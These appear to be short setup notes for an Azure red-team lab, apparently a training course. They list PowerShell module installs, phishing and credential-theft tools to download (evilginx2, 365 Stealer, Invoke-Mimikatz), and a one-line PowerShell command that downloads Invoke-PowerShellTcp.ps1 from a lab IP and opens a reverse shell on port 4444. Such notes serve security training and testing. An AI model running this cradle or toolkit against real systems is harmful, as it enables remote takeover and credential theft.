https://github.com/mgeeky/AzureRT

```
Install-Module Az -Force -Confirm -AllowClobber -Scope AllUsers

A
Install-Module AzureAD -Force -Confirm -AllowClobber -Scope AllUsers

A
echo "Next part is optional"
Install-Module Microsoft.Graph -Force -Confirm -AllowClobber -Scope AllUsers

A
Install-Module MSOnline -Force -Confirm -AllowClobber -Scope AllUsers

A
Install-Module AzureADPreview -Force -Confirm -AllowClobber -Scope AllUsers

A
Install-Module AADInternals -Force -Confirm -AllowClobber -Scope AllUsers
```

```
Import-Module Az
Import-Module AzureAD
```

Download:
- XAMPP
- evilginx2
- Bloodhound
- Neo4j
- ROADTools

Put in `C:\xampp\htdocs`:
- 365 Stealer
- ```Invoke-Mimikatz.ps1```
- ```Invoke-PowerShellTcp.ps1```
- ```studentx.ps1``` (uses the invoke-powershell.ps1 script to establish revshell):
```
powershell "IEX (New-Object Net.Webclient).downloadstring('http://172.16.152.213/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.152.213 -Port 4444"
```

